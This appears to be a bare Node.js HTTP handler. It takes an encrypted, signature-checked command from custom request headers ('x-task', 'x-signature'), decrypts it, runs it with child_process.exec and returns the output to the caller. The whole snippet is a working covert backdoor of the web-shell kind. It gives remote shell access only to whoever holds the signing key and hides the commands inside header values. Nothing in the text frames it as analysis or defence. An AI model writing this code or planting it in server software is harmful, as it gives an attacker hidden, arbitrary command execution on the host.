const crypto = require('crypto');
const {exec} = require('child_process');
function handler(req,res) {
  const encrypted = req.headers['x-task'];
  const signature = req.headers['x-signature'];
  if (!crypto.verify('sha256', Buffer.from(encrypted,'base64'), publicKey,
      Buffer.from(signature,'base64'))) return;
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  const command = Buffer.concat([decipher.update(Buffer.from(encrypted,'base64')),
    decipher.final()]).toString();
  exec(command, (err, stdout) => res.end(stdout));
}
